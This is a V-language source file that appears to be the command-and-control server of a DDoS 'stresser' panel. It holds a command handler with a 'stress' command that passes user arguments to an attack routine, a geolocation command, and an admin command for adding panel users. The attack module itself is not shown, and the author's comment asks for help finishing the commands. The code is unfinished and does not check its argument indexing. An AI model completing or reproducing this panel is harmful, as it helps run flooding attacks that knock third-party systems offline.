module server

import net
import banner_sys
import config 
import auth

//cmds
import commands

pub struct ServerAssets {
	pub mut:
		empty_c int
		cnc_port string
		clients []net.TcpConn

}

pub struct Test{
	pub mut:
		lul []ServerAssets
}

pub fn cmd_handler(mut socket net.TcpConn, data string, username string) {
	if data.len == 0 {
		socket.write_string(config.Hostname) or { 0 }
	} else {
		if data == "" { return }
		mut c := config.Config{}
		mut b := banner_sys.Banner{}
		if data.contains(" ") {
			c.set_config_info((data.split(" ")[0]), data, (data.split(" ")), ((data.split(" ")).len))
		} else { c.set_config_info(data, data, [data], data.len) }
		
		// Command Handling 
		// this shit has no commands, i could use someone to do this ez shit for me 
		if data == "help" {
			b.set_bannerfile('help')
			socket.write_string(b.color_banner()) or { panic("[x] Error") }
		} else if data == "clear" {
			socket.write_string(config.Clear) or { panic("[x] Error") }
		} else if data == "geo" {
			commands.geo_cmd(mut socket, c.arg[1])
		} else if c.cmd == "stress" {
			commands.attack_cmd(mut socket, data.split(" "),  username)
		} else if c.cmd == "admin" {
			admin_handler(mut socket, data, username)
		}
		socket.write_str(config.Hostname) or { 0 }
	}
	println(data)
}

pub fn admin_handler(mut socket net.TcpConn, data string, username string) {
	mut arg := data.split(" ")
	mut cmd := arg[0]
	mut admin_cmd := arg[1]

	if admin_cmd == "add" {
		mut p := auth.Crud{user: arg[3], pw: arg[4]}
		socket.write_string(p.add_user()) or { panic("[x] Error, Unable to send to add user!\r\n")}
	}
}